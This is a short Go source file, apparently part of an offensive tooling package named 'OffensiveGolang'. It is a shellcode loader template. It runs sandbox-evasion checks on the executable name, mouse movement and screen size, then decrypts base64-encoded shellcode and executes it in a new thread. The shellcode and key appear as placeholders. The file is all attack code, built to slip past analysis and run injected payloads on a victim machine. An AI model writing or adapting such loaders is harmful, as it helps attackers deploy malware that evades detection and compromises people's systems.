package main

import "C"
import (
	"OffensiveGolang/pkg/evasion"
	shellcode "OffensiveGolang/pkg/payloads/injections/createThread"
)

func main() {
	evasion.CheckNameEXE("main.exe")
	evasion.CheckMouse(5)
	evasion.CheckScreen()
	enc_string := "<SHELLCODE ENCRYPTED AND BASE64-ENCODED>"
	key := "<KEY BASE64-ENCODED>"
	shellcode.ShellCodeThreadExecute(enc_string, key)
}
